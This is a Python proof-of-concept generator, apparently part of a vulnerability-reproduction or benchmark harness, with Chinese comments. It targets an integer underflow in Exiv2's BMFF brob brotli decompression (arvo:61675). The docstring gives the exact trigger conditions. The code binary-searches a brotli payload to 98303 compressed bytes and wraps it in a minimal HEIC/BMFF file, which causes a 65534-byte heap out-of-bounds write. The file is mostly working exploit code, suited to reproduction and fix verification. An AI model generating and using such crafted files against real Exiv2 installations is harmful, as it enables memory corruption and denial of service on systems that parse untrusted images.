"""S16（arvo:61675 / Exiv2 BMFF brob）构造器：整数下溢导致 available_out 巨大的越界写。

缺陷（src/bmffimage.cpp:192 brotliUncompress）：
    arr.alloc(uncompressedLen);
    available_out = uncompressedLen - total_out;   // size_t：total_out 更大时下溢
    next_out = arr.data() + total_out;
    BrotliDecoderDecompressStream(..., &available_out, &next_out, &total_out);

DoS 保护把 uncompressedLen 截到 131072，但没有检查 total_out 是否已经超过它；
下一次迭代 available_out = 131072 - total_out 变成 2^64-65534 量级，next_out 已指到缓冲区外，
brotli 继续 memcpy -> WRITE of size 65534（ASAN container-overflow / CWE-122 类写越界）。
fix 版在 break 条件里补了 total_out > 131072。

触发条件（实测推出来的关键点）：
首次 alloc 的 uncompressedLen = compressedSize * 2 必须大于 131072，否则会先被截断、
total_out 永远追不上；同时解压总量要明显大过这个初值，让 brotli 继续要输出。
即让压缩后大小恰为 98303 字节 -> 2C = 196606 > 131072，total_out 冲到 196606 后被截回 131072，
下一次 available_out = 131072 - 196606 = 2^64-65534 -> 越界写 65534 字节。
构造：解压内容 = 300000 个 0 + 一段随机字节（随机段长度二分到让 brotli 输出正好 98303 字节）。

容器：最小 BMFF = ftyp（brand heic）+ brob（4 字节 realType exif + brotli 流）。
"""
from __future__ import annotations

import json
import os
import struct
import subprocess
import tempfile

BROTLI_PYTHON = "/usr/bin/python3"
DEFAULTS = {"comp_target": 98303, "zeros": 300000, "seed": 1}

FIELDS = {
    "comp_target": "int, 目标压缩字节数；2*comp_target 必须 > 131072 才能触发（默认 98303）",
    "zeros": "int, 解压内容里零字节段长度（默认 300000，要明显大于 2*comp_target）",
    "seed": "int, 随机段种子（保证可复现，默认 1）",
}

_GENERATOR = r'''
import json, random, struct, sys
import brotli

params, out = json.loads(sys.argv[1]), sys.argv[2]
target = int(params["comp_target"]); zeros = int(params["zeros"]); seed = int(params["seed"])

def box(tag, payload):
    return struct.pack(">I", 8 + len(payload)) + tag + payload

lo, hi = 1, 400000
best = None
while lo <= hi:
    mid = (lo + hi) // 2
    r = random.Random(seed)
    payload = b"\x00" * zeros + bytes(r.randrange(256) for _ in range(mid))
    comp = brotli.compress(payload)
    d = abs(len(comp) - target)
    if best is None or d < best[0]:
        best = (d, comp)
    if len(comp) < target:
        lo = mid + 1
    else:
        hi = mid - 1

comp = best[1]
ftyp = box(b"ftyp", b"heic" + struct.pack(">I", 0) + b"mif1heic")
data = ftyp + box(b"brob", b"exif" + comp)
open(out, "wb").write(data)
print(json.dumps({"comp": len(comp), "file": len(data), "delta": best[0]}))
'''


class AvailResult:
    """构造结果（普通类：本模块可能被按文件路径动态加载）。"""

    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "bmff-brob"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict, *, python: str = BROTLI_PYTHON) -> AvailResult:
    """按字段生成一个最小 BMFF（ftyp + brob），brob 里是调好大小的 brotli 流。"""
    fields = dict(fields or {})
    used, dropped = {}, []
    params = dict(DEFAULTS)
    for key in ("comp_target", "zeros", "seed"):
        if key in fields:
            try:
                params[key] = int(fields[key])
            except (TypeError, ValueError):
                return AvailResult(False, reason="%s 必须是整数" % key)
    if params["comp_target"] < 1:
        return AvailResult(False, reason="comp_target 必须为正")
    if params["zeros"] < 0:
        return AvailResult(False, reason="zeros 不能为负")
    if 2 * params["comp_target"] <= 131072:
        params["warning"] = "2*comp_target <= 131072：首次 alloc 会被 DoS 上限截断，可能打不到"
    used.update(params)
    for k in fields:
        if k not in FIELDS:
            dropped.append({"field": k, "reason": "avail 构造器不识别该字段"})

    fd, path = tempfile.mkstemp(suffix=".heic")
    os.close(fd)
    try:
        r = subprocess.run([python, "-c", _GENERATOR, json.dumps(params), path],
                           capture_output=True, text=True, timeout=300)
        if r.returncode != 0:
            return AvailResult(False, reason="生成失败: " + (r.stderr or r.stdout)[-300:])
        with open(path, "rb") as fh:
            data = fh.read()
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass
    if not data.startswith(b"\x00\x00\x00\x18ftyp"):
        return AvailResult(False, reason="生成结果不是 BMFF（ftyp 缺失）")
    return AvailResult(True, data, used, dropped)


def proof_of_concept() -> bytes:
    res = build({})
    if not res.ok:
        raise RuntimeError("avail builder failed: " + res.reason)
    return res.data
